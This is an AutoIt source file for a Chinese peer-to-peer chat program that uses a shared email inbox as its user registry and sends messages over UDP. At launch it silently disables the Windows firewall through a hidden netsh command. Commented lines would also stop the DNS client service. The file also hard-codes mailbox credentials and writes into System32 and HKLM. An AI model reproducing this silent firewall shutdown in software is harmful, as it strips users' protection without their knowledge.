#NoTrayIcon
#Region ;**** 参数创建于 ACNWrapper_GUI ****
#AutoIt3Wrapper_icon=D:\autoit3\Aut2Exe\Icons\InDesign.ico
#AutoIt3Wrapper_Res_Comment=小旋风免服务器聊天工具
#AutoIt3Wrapper_Res_Description=旋风科技
#AutoIt3Wrapper_Res_Fileversion=1.0.0.0
#AutoIt3Wrapper_Res_LegalCopyright=旋风科技
#EndRegion ;**** 参数创建于 ACNWrapper_GUI ****
#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#include <WinAPI.au3>
#include <StructureConstants.au3>
#Include <file.au3>
#include <GUIListBox.au3>
#include <pop3.au3>
#include <GUIConstants.au3>
#include <ListboxConstants.au3>
#include <string.au3>
#Include <GuiEdit.au3>
#include <Sound.au3>
#include <GuiStatusBar.au3>
#include <ScrollBarConstants.au3>
;RunWait(@ComSpec & ' /c net stop "dns client"',"",@SW_HIDE)
;RunWait("netsh firewall set opmode mode=disable","",@SW_HIDE)
;netsh firewall add allowedprogram 程序完整路径 在防火墙中"例外"的名称 enable
;RunWait("netsh firewall add allowedprogram "&@ScriptDir&"\"&@ScriptName&" "&@ScriptName&" enable","",@SW_HIDE)
;MsgBox(0,"",@ScriptName)
 Dim $dll
 
$p_pop3Server = "pop3.sina.com.cn" ; smtp服务器 address for the smtp-server to use - REQUIRED
$s_SmtpServer = "smtp.sina.com.cn" ; smtp服务器 address for the smtp-server to use - REQUIRED
$s_FromName = "keyrec" ; 邮件发送人 name from who the email was sent
$s_FromAddress = "35888894lw@sina.com.cn" ; 邮件发送者地址address from where the mail should come
$s_ToAddress = "35888894lw@sina.com.cn" ; 邮件发送给谁 destination address of the email - REQUIRED
$as_Body = @ComputerName
$s_AttachFiles ="" ; 附件地址 the file you want to attach- leave blank if not needed
$s_CcAddress = "" ; address for cc - leave blank if not needed
$s_BccAddress = "" ; address for bcc - leave blank if not needed
$s_Username = "35888894lw" ; 用户名 username for the account used from where the mail gets sent - REQUIRED
$s_Password = "XXXX" ; 密码password for the account used from where the mail gets sent - REQUIRED
$IPPort =25 ; 发送端口
$ssl = 0 ; 安全连接
$network=0;是否接听
Dim $socket1;连接发送
Dim $socket2;连接接听
Dim $neirong[10000]
Dim $jhm
Global $oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
Global $oMyRet[2]
 $objEmail=""
 $HexNumber=""
 $geshu=0;------------人物个数
 $duankou=65532;----端口
 $weizhi=0;位置指针
 
If Ping("www.baidu.com",1000)=0 Then Exit
 
FileInstall("SkinCrafterDll.dll", @SystemDir & "\SkinCrafterDll.dll", 1)
FileInstall("Gloss_ST.skf", @SystemDir & "\mon.skf", 1)
 
#Region ### START Koda GUI section ### Form=F:\AU3学习\邮箱中转服务\Form1.kxf
$Form1 = GUICreate("小旋风免服务器聊天工具V1.0", 412, 379, 330, 118)
_SkinGUI(@SystemDir & "\SkinCrafterDll.dll",@SystemDir & "\mon.skf", $Form1)
GUICtrlCreateGroup("历史聊天内容", 8, 80, 297, 185)
;$Edit1 = GUICtrlCreateEdit("", 18, 101, 273, 145, BitOR($ES_AUTOVSCROLL,$ES_AUTOHSCROLL,$ES_READONLY,$ES_WANTRETURN,$WS_VSCROLL))
$Edit1 = GUICtrlCreateEdit("", 18, 101, 273, 145, BitOR($ES_AUTOVSCROLL,$ES_READONLY,$WS_VSCROLL)) 
 
GUICtrlSetLimit(-1,9999999999)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Edit2 = GUICtrlCreateEdit("", 16, 280, 281, 89, BitOR($ES_AUTOVSCROLL,$ES_WANTRETURN))
GUICtrlSetTip(-1,"请输入发送的信息")
$Button1 = GUICtrlCreateButton("群发", 320, 312, 75, 25, 0)
GUICtrlSetState (-1, $GUI_DISABLE )
GUICtrlSetTip(-1,"可以将消息发送给列表每一个在线的人")
$Button2 = GUICtrlCreateButton("关闭", 320, 344, 75, 25, 0)
GUICtrlSetTip(-1,"关闭软件")
$List1 = GUICtrlCreateList("", 320, 80, 81, 188, $LBS_NOSEL)
GUICtrlSetTip(-1,"参与聊天的成员列表")
$Group1 = GUICtrlCreateGroup("网络状态", 8, 8, 185, 65)
$Label3 = GUICtrlCreateLabel("IP:未知", 25, 27, 153, 17)
$Label2 = GUICtrlCreateLabel("正在初始化...", 24, 46, 161, 17)
 
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Group2 = GUICtrlCreateGroup("名字设置", 200, 8, 129, 65)
$Input1 = GUICtrlCreateInput("", 208, 32, 113, 21)
GUICtrlSetTip(-1,"请输入一个您喜欢的名字，点右方的上传按钮上传给其他人")
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Button3 = GUICtrlCreateButton("更新", 344, 32, 51, 17, 0)
GUICtrlSetTip(-1,"更新参与聊天的成员信息")
$Button4 = GUICtrlCreateButton("删除", 344, 56, 51, 17, 0)
GUICtrlSetTip(-1,"将不在线的成员删除，每个人都可以当管理员")
$Button5 = GUICtrlCreateButton("发送", 320, 280, 75, 25, 0)
GUICtrlSetTip(-1,"将消息发送给对方，请在成员列表中选择成员")
GUICtrlSetState (-1, $GUI_DISABLE )
$Button6 = GUICtrlCreateButton("上传", 344, 8, 51, 17, 0)
GUICtrlSetTip(-1,"用来上传或修改自己的名字")
GUISetState(@SW_SHOW)
#EndRegion ### END Koda GUI section ###
GUICtrlSetData($Label2,"正在初始化，请稍侯...")
RunWait("netsh firewall set opmode mode=disable","",@SW_HIDE)
GUICtrlSetData($Input1,RegRead ( "HKEY_LOCAL_MACHINE\SOFTWARE\Windows", "WIDC"))
 
 
        UDPStartup()
_jihuoma()
$s_Subject = "";邮件标题 subject from the email - can be anything you want it to be
$socket2 = UDPBind($jhm, $duankou)
 
 
;-----------------------------------------------------------------------------------刷新信息
 
findfr()
;----------------------------------------------------------------------------------看看列表中有无自己的IP
 jianchanm();检查自己的名字是否在列表中
 
GUICtrlSetData($Label2,"初始化成功！")
;-----------------------------------------------------------------------------------
        $sound1 = _SoundOpen("data\notify.wav")
        $sound2 = _SoundOpen("data\chimes.wav")
        $sound3 = _SoundOpen("data\recycle.wav")
        $sound4 = _SoundOpen("data\tada.wav")
 
 
 
 
 
 
While 1
        $nMsg = GUIGetMsg()
        Switch $nMsg
                Case $GUI_EVENT_CLOSE
                        Quit()
                Case $Button3;-------------------------更新
                        $s_Subject =StringMid(StringToBinary($jhm&"`"&GUICtrlRead($Input1),3),3);邮件标题 subject from the email - can be anything you want it to be
                                GUICtrlSetState ( $Button3, $GUI_DISABLE )
                                GUICtrlSetData($Label2,"正在更新，请稍侯...")
                                findfr()
                                GUICtrlSetData($Label2,"更新完毕！")
                                GUICtrlSetState ( $Button3, $GUI_ENABLE )
                Case $Button6;-------------------------上传
 
                                If GUICtrlRead($Input1)<>"" Then
                                GUICtrlSetData($Label2,"正在检查，请稍侯...")
                                 findfr();先刷新        
                                Switch namechack();检查名字看是否重复,0名字重复，1名字重复对方不在线，2名字可用,3自己想改名字
                                        Case 0
                                                GUICtrlSetData($Label2,"此名已经被使用!")
                                        Case 1
                                                GUICtrlSetData($Label2,"发现相同名字,处理中...")
                                                _Pop3Dele($weizhi+1)
                                                ; findfr();先刷新                
                                                _Pop3Quit()        
                                                GUICtrlSetData($Label2,"处理完毕!")
                                                _pop3Connect ($p_pop3Server, $s_Username, $s_Password,110)        
                                                _SoundPlay($sound4)
                                                shangchuanmingzi()        
                                                GUICtrlSetData($Label2,"更新完毕,请刷新信息!")                                                        
                                        Case 2
                                                _SoundPlay($sound4)
                                                shangchuanmingzi()
                                        Case 3
                                         GUICtrlSetData($Label2,"验证合法性,处理中...")
                                                _Pop3Dele($weizhi+1)
                                                ; findfr();先刷新                
                                                _Pop3Quit()        
                                                GUICtrlSetData($Label2,"处理完毕!")
                                                _pop3Connect ($p_pop3Server, $s_Username, $s_Password,110)        
                                                _SoundPlay($sound4)
                                                shangchuanmingzi()        
                                                GUICtrlSetData($Label2,"更新完毕,请刷新信息!")                                
 
                                EndSwitch
 
 
 
                        EndIf
                Case $Button4;--------------------------删除
                        Local $chuli=""
                        ;$neirong[_GUICtrlListBox_GetCaretIndex ($List1)]
                                GUICtrlSetState ( $Button4, $GUI_DISABLE )
                                GUICtrlSetData($Label2,"正在检测，请稍侯...")
                                ;MsgBox(0,"",StringMid($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],1,StringInStr($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],"`")-1))
                                If Ping(StringMid($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],1,StringInStr($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],"`")-1),3000)>0 Then
                                ;        lianjie()
                                        GUICtrlSetData($Label2,"此人在线,不可删除")
                                        $network=1
                                Else
                                        $chuli=StringMid($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],1,StringInStr($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],"`")-1);IP
                                        findfr()
                                        For $i=0 To $geshu-1
                                                If StringMid($neirong[$i],1,StringInStr($neirong[$i],"`")-1)=$chuli Then
                                                        _SoundPlay($sound3)
                                                        _Pop3Dele($i+1)
                                                ; findfr();先刷新                
                                                _Pop3Quit()        
                                                GUICtrlSetData($Label2,"删除完毕!")
                                                _pop3Connect ($p_pop3Server, $s_Username, $s_Password,110)        
                                                ExitLoop
                                                EndIf
                                                Next
                                        EndIf
                                GUICtrlSetState ( $Button4, $GUI_ENABLE )
                        Case $Button5;---------------------------------发送
                                ;MsgBox(0,"",$socket1&" "&$socket2)
                                If $socket1<>"" And $jhm<>StringMid($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],1,StringInStr($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],"`")-1)  Then
                                 UDPSend($socket1,StringToBinary($jhm&"`~#"&GUICtrlRead($Edit2),3))
                                 GUICtrlSetData($Edit1,@CRLF&@CRLF&@CRLF&GUICtrlRead($Input1)&"  "&@HOUR&":"&@MIN&":"&@SEC&@CRLF&GUICtrlRead($Edit2),3)
                                 _GUICtrlEdit_Scroll($Edit1, $SB_SCROLLCARET  )
                                 GUICtrlSetData($Edit2,"")
                         Else
                                 GUICtrlSetData($Label2,"不要和自己聊天...")
                                EndIf
 
                        Case $List1;------------------------------------鼠标点击LISTBOX事件
                            GUICtrlSetData($Label2,"正在检测，请稍侯...")
                                                                        _SoundPlay($sound1)
                        If Ping(StringMid($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],1,StringInStr($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],"`")-1),500)>0 Then
                                lianjie()
                                GUICtrlSetData($Label2,"连接成功！")
                                $network=1
                                Else
                                GUICtrlSetData($Label2,"对方不在线！")
                        EndIf
                Case $Button1;群发
                        GUICtrlSetData($Label2,"正在群发，请稍侯...")
                        GUICtrlSetData($Edit1,@CRLF&@CRLF&@CRLF&GUICtrlRead($Input1)&"  "&@HOUR&":"&@MIN&":"&@SEC&@CRLF&GUICtrlRead($Edit2),3)
                        _GUICtrlEdit_Scroll($Edit1, $SB_SCROLLCARET)
                        For $i=0 To $geshu-1
                        $socket3 = UDPOpen(StringMid($neirong[$i],1,StringInStr($neirong[$i],"`")-1), $duankou)
                        If $socket3<>"" And $jhm<>StringMid($neirong[$i],1,StringInStr($neirong[$i],"`")-1)  Then
                                UDPSend($socket3,StringToBinary($jhm&"`~#"&GUICtrlRead($Edit2),3))
                        EndIf
                        UDPCloseSocket ($socket3)
 
                 Next
                 GUICtrlSetData($Label2,"群发完毕!")
 
                 GUICtrlSetData($Edit2,"")
                Case $Button2;清除
                 Quit()
 
        EndSwitch
 
         $data = UDPRecv($socket2, 20000)
    If $data <> "" Then
                $xinxi=BinaryToString($data,3)
                $shui=StringMid($xinxi,1,StringInStr($xinxi,"`~#")-1)
                For $i=0 To $geshu-1
                        If StringMid($neirong[$i],1,StringInStr($neirong[$i],"`")-1)=$shui Then
                                $shui=StringMid($neirong[$i],StringInStr($neirong[$i],"`")+1)
                                ExitLoop
                                EndIf
                        Next
                $data=StringMid($xinxi,StringInStr($xinxi,"`~#")+3)
                                                _SoundPlay($sound2)
      ;_GUICtrlEdit_AppendText($Edit1,@CRLF&StringMid($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],StringInStr($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],"`")+1)&"  "&@HOUR&":"&@MIN&":"&@SEC&@CRLF&BinaryToString($data,3))
        GUICtrlSetData($Edit1,@CRLF&@CRLF&@CRLF&$shui&"  "&@HOUR&":"&@MIN&":"&@SEC&@CRLF&$data,3)
        _GUICtrlEdit_Scroll($Edit1, $SB_SCROLLCARET  )
 
  EndIf
    sleep(10)
 
WEnd
 
Func _INetSmtpMailCom($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject = "", $as_Body = "", $s_AttachFiles = "", $s_CcAddress = "", $s_BccAddress = "", $s_Username = "", $s_Password = "",$IPPort=25, $ssl=0)
    $objEmail = ObjCreate("CDO.Message")
    $objEmail.From = '"' & $s_FromName & '" <' & $s_FromAddress & '>'
    $objEmail.To = $s_ToAddress
    Local $i_Error = 0
    Local $i_Error_desciption = ""
    If $s_CcAddress <> "" Then $objEmail.Cc = $s_CcAddress
    If $s_BccAddress <> "" Then $objEmail.Bcc = $s_BccAddress
    $objEmail.Subject = $s_Subject
    If StringInStr($as_Body,"<") and StringInStr($as_Body,">") Then
        $objEmail.HTMLBody = $as_Body
    Else
        $objEmail.Textbody = $as_Body & @CRLF
    EndIf
    If $s_AttachFiles <> "" Then
        Local $S_Files2Attach = StringSplit($s_AttachFiles, ";")
        For $x = 1 To $S_Files2Attach[0]
            $S_Files2Attach[$x] = _PathFull ($S_Files2Attach[$x])
            If FileExists($S_Files2Attach[$x]) Then
                $objEmail.AddAttachment ($S_Files2Attach[$x])
            Else
                $i_Error_desciption = $i_Error_desciption & @lf & 'File not found to attach: ' & $S_Files2Attach[$x]
                SetError(1)
                return 0
            EndIf
        Next
    EndIf
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = $s_SmtpServer
    $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = $IPPort
;Authenticated SMTP
    If $s_Username <> "" Then
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusername") = $s_Username
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendpassword") = $s_Password
    EndIf
    If $Ssl Then
        $objEmail.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
    EndIf
;Update settings
    $objEmail.Configuration.Fields.Update
; Sent the Message
    $objEmail.Send
    if @error then
        SetError(2)
        return $oMyRet[1]
    EndIf
EndFunc ;==>_INetSmtpMailCom
;
 
; Com Error Handler
Func MyErrFunc()
    $HexNumber = Hex($oMyError.number, 8)
    $oMyRet[0] = $HexNumber
    $oMyRet[1] = StringStripWS($oMyError.description,3)
    ConsoleWrite("### COM Error !    Number: " & $HexNumber & "    ScriptLine: " & $oMyError.scriptline & "    Description:" & $oMyRet[1] & @LF)
    SetError(1); something to check for when this function returns
    Return
EndFunc ;==>MyErrFunc 
 
 
Func _jihuoma();获得IP
Local        $jishu=0
Local        $ip=""
        FileDelete(@TempDir & "\jihuoma1.tmp")
        InetGet("http://www.ip138.com/ip2city.asp",@TempDir & "\jihuoma1.tmp",1,0)
                  $file=FileOpen(@TempDir & "\jihuoma1.tmp",0)
        While 1
                        $po=1
                $line = FileReadLine($file)
                If @error = -1 Then ExitLoop
                        If StringInStr($line,"[") Then
                        $first1=StringInStr($line,"[")+1
                       $end1=StringInStr($line,"]")
                        $jhm=StringMid($line,$first1,$end1-$first1)
                                                GUICtrlSetData($Label3,"IP:"&$jhm)
                                                ExitLoop
                                        EndIf   
                                $po+=1
                                If $po>10 Then ExitLoop
                        WEnd
  EndFunc
 
Func findfr();更新信息
        clea()
_pop3Disconnect()
_pop3Connect ($p_pop3Server, $s_Username, $s_Password,110)
;$daxiao=_Pop3List(1)
$start=_Pop3Stat()
;MsgBox(0,$start[1],$start[2])
;MsgBox(0,"",UBound($daxiao,0)&" "&$daxiao[0]&"  "&$daxiao[1]&"  "&$cs)
;$text=_Pop3Retr(6)
;MsgBox(0,"",$text)
$geshu=$start[1]
For $i= 1 To $start[1]
$muti= _Pop3Top($i, 1)
;MsgBox(0,"",$muti)
$bt1="0x"&StringMid($muti,StringInStr($muti,"Subject:")+9,StringInStr($muti,"Date:")-StringInStr($muti,"Subject:")-11)
;$bt2=StringMid($bt1,StringInStr($bt1,"?",2,3)+1,StringInStr($bt1,"==")-StringInStr($bt1,"?",2,3)-1)
;$sInputBoxAnswer = InputBox("1","1",$bt1," ","-1","-1","-1","-1")
;MsgBox(0,$bt1,BinaryToString($bt1))
;MsgBox(0,"",BinaryToString($bt1,3))
$bt2=BinaryToString($bt1,3)
$neirong[$i-1]=$bt2
_GUICtrlListBox_AddString($List1, StringMid($neirong[$i-1],StringInStr($neirong[$i-1],"`")+1))
Next
;  _Pop3Retr(1)
;MsgBox(0,"",_Pop3Dele(1) )
 jianchanm();看看选择没
;
EndFunc
 
 
 
Func clea();清除功能
                For $i=0 To 9999
                        If $neirong[$i]="" Then ExitLoop
                        _GUICtrlListBox_DeleteString($List1,0)
                        $neirong[$i]=""
                        Next
                EndFunc
 
 
Func lianjie();连接
 
        UDPCloseSocket ( $socket1)
        UDPCloseSocket ( $socket2)
        If $jhm<>"" Then
        $socket1 = UDPOpen(StringMid($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],1,StringInStr($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],"`")-1), $duankou)
        If @error <> 0 Then Exit
        ;$socket2 = UDPBind(StringMid($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],1,StringInStr($neirong[_GUICtrlListBox_GetCaretIndex ($List1)],"`")-1), 80)
        $socket2 = UDPBind($jhm, $duankou)
        $network=1
   EndIf
        EndFunc
 
        Func OnAutoItExit()
    UDPCloseSocket($socket1)
         UDPCloseSocket($socket2)
    UDPShutdown()
EndFunc
 
Func namechack();检查名字看是否重复,0名字重复，1名字重复对方不在线，2名字可用,3自己想改名字
        Local $fucker=2
        For $i=0 To $geshu-1
                If GUICtrlRead($Input1)=StringMid($neirong[$i],StringInStr($neirong[$i],"`")+1) Then
                        If Ping(StringMid($neirong[$i],1,StringInStr($neirong[$i],"`")-1),1000)>0 Then
                                GUICtrlSetData($Label2,"此名已经被使用,请换个名字")
                                $weizhi=$i
                                $fucker= 0
                                ExitLoop
                        Else
                                $weizhi=$i
                                $fucker=0
                                ExitLoop
                                EndIf
                        EndIf
                        If StringMid($neirong[$i],1,StringInStr($neirong[$i],"`")-1)=$jhm Then
                                $weizhi=$i
                                $fucker=3
                                ExitLoop
                                EndIf
                Next
 
        Return $fucker
EndFunc
 
Func shangchuanmingzi();上传名字
                                RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Windows" ,"WIDC", "REG_SZ", GUICtrlRead($Input1))
                                GUICtrlSetState ( $Button6, $GUI_DISABLE )
                                GUICtrlSetData($Label2,"正在上传，请稍侯...")
                                _jihuoma()
$s_Subject =StringMid(StringToBinary($jhm&"`"&GUICtrlRead($Input1),3),3);邮件标题 subject from the email - can be anything you want it to be
                                _INetSmtpMailCom($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject, $as_Body, $s_AttachFiles, $s_CcAddress, $s_BccAddress, $s_Username, $s_Password, $IPPort, $ssl)
                                GUICtrlSetData($Label2,"上传成功！")
                                GUICtrlSetState ( $Button6, $GUI_ENABLE )
EndFunc
 
Func jianchanm();检查自己的IP是否在列表中
                                                For $i=0 To $geshu-1
                                                If StringMid($neirong[$i],1,StringInStr($neirong[$i],"`")-1)=$jhm And _GUICtrlListBox_GetCaretIndex($List1)>=0 Then
                                                GUICtrlSetState ($Button5, $GUI_ENABLE )
                                                GUICtrlSetState ($Button1, $GUI_ENABLE )
                                                ExitLoop
                                                Else
                                                GUICtrlSetState ($Button5, $GUI_DISABLE )
                                                GUICtrlSetState ($Button1, $GUI_DISABLE )
                                                EndIf
                                                Next
EndFunc        
 
Func _SkinGUI($SkincrafterDll, $SkincrafterSkin, $Handle)
        $dll = DllOpen($SkincrafterDll)
        DllCall($dll, "int:cdecl", "InitLicenKeys", "wstr", "1", "wstr", "", "wstr", "1@1.com", "wstr", "1")
        DllCall($dll, "int:cdecl", "InitDecoration", "int", 1)
        DllCall($dll, "int:cdecl", "LoadSkinFromFile", "wstr", $SkincrafterSkin)
        DllCall($dll, "int:cdecl", "DecorateAs", "int", $Handle, "int", 25)
        DllCall($dll, "int:cdecl", "ApplySkin")
EndFunc   ;==>_SkinGUI
 
Func Quit()
        _SoundClose ( $sound1 )
        _SoundClose ( $sound2 )
                _SoundClose ( $sound3 )
        _SoundClose ( $sound4 )
        GUISetState(@SW_HIDE)
        DllCall($dll, "int", "DeInitDecoration")
        DllCall($dll, "int", "RemoveSkin")
        DllClose($dll)
        Exit
EndFunc